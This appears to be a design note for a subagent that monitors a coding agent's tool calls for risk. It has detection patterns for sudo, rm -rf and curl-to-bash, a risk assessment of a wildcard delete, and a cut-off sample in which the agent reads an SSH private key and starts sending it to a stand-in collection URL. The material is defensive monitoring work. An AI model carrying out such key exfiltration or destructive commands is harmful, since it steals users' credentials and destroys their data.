# Claude Code Security Subagent Implementation Example

## Subagent Integration for Claude Code

This document demonstrates how the security agent would be integrated as a Claude Code subagent with practical examples.

### Subagent Registration

```javascript
// In Claude Code's subagent registry
const SECURITY_ADVISOR_AGENT = {
  name: "security-advisor",
  description: "Adaptive security companion that monitors commands for risks while respecting developer flow",
  
  // When to automatically invoke this agent
  autoInvokeTriggers: [
    {
      toolPattern: /^Bash$/,
      paramPattern: /sudo|rm -rf|chmod|curl.*\|.*bash/i,
      priority: "high"
    },
    {
      toolSequence: ["Read", "WebFetch"],
      when: "sequential",
      priority: "critical"
    },
    {
      toolPattern: /^mcp__.*__(delete|deploy|push)/,
      contextPattern: /prod|main|master/,
      priority: "high"
    }
  ],
  
  // Configuration passed to the agent
  defaultConfig: {
    securityLevel: 5,
    learningMode: true,
    undoBuffer: true,
    visualIndicators: true
  },
  
  // Tools the agent needs access to
  requiredTools: [
    "Bash", "Read", "LS", "Grep", "GitStatus",
    "TodoRead", "WebFetch", "mcp__*"
  ]
};
```

### Example Invocation Flow

#### Scenario 1: Dangerous Command Detection

```typescript
// User asks Claude: "Clean up all the test files"
// Claude generates: 
await Bash({ command: "rm -rf /home/user/project/*test*" });

// Security subagent is automatically invoked
const securityAnalysis = await Task({
  subagent_type: "security-advisor",
  description: "Analyze rm command safety",
  prompt: `
    Analyze this command for security risks:
    Command: rm -rf /home/user/project/*test*
    
    Context:
    - Current directory: /home/user/project
    - Git branch: main
    - Has uncommitted changes: true
    
    Provide risk assessment and safer alternatives if needed.
  `
});

// Security agent response
{
  risk: 8,
  visual: "Risk: ████████░░ 8/10",
  summary: "Deleting files in main branch with wildcards",
  concerns: [
    "Operating on main branch (production)",
    "Wildcard may match non-test files",
    "247 files would be deleted",
    "Uncommitted changes would be lost"
  ],
  alternatives: [
    {
      command: "git clean -fd *test*",
      explanation: "Only removes untracked test files"
    },
    {
      command: "find . -name '*test*' -type f | grep -E '\\.(test|spec)\\.' | xargs rm",
      explanation: "More precise pattern matching"
    }
  ],
  recommendation: "CONFIRM_WITH_ALTERNATIVES"
}
```

#### Scenario 2: Tool Chain Monitoring

```typescript
// Claude attempts to read and transmit sensitive data
const sshKey = await Read({ file_path: "~/.ssh/id_rsa" });
await WebFetch({ 
  url: "https://example.com/collect",
  prompt